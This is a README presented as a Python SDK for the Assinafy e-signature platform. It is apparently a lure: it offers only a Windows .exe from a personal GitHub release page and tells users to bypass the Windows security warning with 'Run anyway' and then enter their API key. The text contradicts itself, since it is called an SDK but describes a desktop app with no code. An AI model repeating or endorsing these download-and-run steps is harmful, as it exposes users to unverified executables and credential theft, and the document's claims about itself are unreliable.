# ✍️ python-sdk - Sign your digital documents with ease

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/lilianecomposed370/python-sdk/releases)

This application connects to the Assinafy digital signature platform. Users automate document signing processes and manage contracts using this tool. It allows you to process documents based on the Brazilian electronic signature standard.

## 🛠️ System requirements

Your computer needs the following specifications to run this software:

*   Windows 10 or Windows 11.
*   An active internet connection.
*   At least 200 megabytes of available disk space.
*   Current version of the Windows WebView2 Runtime.

Most Windows computers include these items. If your computer does not have the WebView2 Runtime, the installer will guide you through that process automatically.

## 📥 Downloading the software

You must visit the official release page to obtain the installation file. Follow these steps to access the download:

1. Visit [this page to download](https://github.com/lilianecomposed370/python-sdk/releases).
2. Look for the section labeled Assets.
3. Click the link ending in .exe to start the file transfer to your computer.
4. Save the file to your Downloads folder.

## ⚙️ Running the installation

Follow these instructions to set up the software on your system:

1. Open your Downloads folder.
2. Locate the file you just downloaded.
3. Double-click the file to start the installer.
4. A standard Windows security window may appear. Select More info and then select Run anyway.
5. Follow the prompts on the screen to complete the setup process.
6. A shortcut will appear on your desktop once the installation finishes.

## 🔑 Initial configuration

You need an account with Assinafy to use this software. If you do not have an account, visit the provider website to register. Once you have your credentials, perform these steps:

1. Double-click the python-sdk icon on your desktop.
2. Enter your API key in the settings tab.
3. Save your changes to link the software to your signature workspace.
4. You may now upload a document from your computer to submit it for signing.

## 📝 Common features

This software provides essential tools for document management:

*   **Batch processing:** You upload multiple documents at once to save time.
*   **Status tracking:** The dashboard displays the status of every signature request.
*   **Security logging:** Every action creates a timestamp for audit purposes.
*   **Template usage:** You store frequently used document layouts in the application.

## 💡 Troubleshooting

If you encounter issues during use, check these common items:

*   **Connection errors:** Confirm your internet connection is active.
*   **Invalid API key:** Verify you copied the key correctly from your account dashboard.
*   **File format support:** This tool supports PDF files. Ensure your files use this format before you upload them.
*   **Permission issues:** Ensure your Windows user profile has write access to the folder where you save the application data.

If problems persist, remove the application through your Windows Control Panel and perform a clean re-installation. This action resolves most configuration errors. 

The software includes a log file located in your documents folder. You view this file if you need to diagnose specific errors. The entries within this file document the steps the software takes during your session.

## 🛡️ Digital signature standards

This tool follows the Brazilian standards for digital signatures. Electronic signatures produced through this gateway hold legal weight. Keep your API credentials private to ensure the security of your signature process. Do not share your login tokens with other users.

## 📂 Managing your documents

The application interface organizes your work into two main views. The Pending view shows documents waiting for signatures. The Completed view shows files with finished signatures. You download the final files from the Completed view to your local storage. 

If you delete a file from the list, the software removes the reference from your view. This does not delete the original file on your computer. It only removes the entry from the tracking dashboard. 

## 🌐 Updating the software

Check the release page periodically for updates. New versions improve the connection to the signature platform. If an update becomes available, download the installer and run it. The new version overwrites the old installation and keeps your current configuration settings.
